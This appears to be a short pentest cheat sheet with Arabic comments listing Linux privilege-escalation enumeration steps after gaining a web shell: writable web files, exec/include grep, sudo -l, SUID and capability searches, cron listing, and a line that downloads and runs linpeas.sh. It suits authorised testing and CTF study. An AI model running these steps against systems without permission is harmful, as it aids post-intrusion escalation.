# HTTP PrivEsc (80)
# بعد شِل ويب/وصول: ابحث عن مسارات كتابة/سكربتات تُنفّذ
find /var/www -writable -type f 2>/dev/null     # ملفات ويب قابلة للكتابة
grep -R "require|include|exec|system" /var/www 2>/dev/null   # نقاط تنفيذ أو LFI
sudo -l                                         # sudo
find / -perm -4000 -type f 2>/dev/null          # SUID
getcap -r / 2>/dev/null                          # قدرات
ls -la /etc/cron* /var/spool/cron*              # مهام مجدولة
id; groups                                      # عضويات حساسة (docker,lxd)
wget https://.../linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh
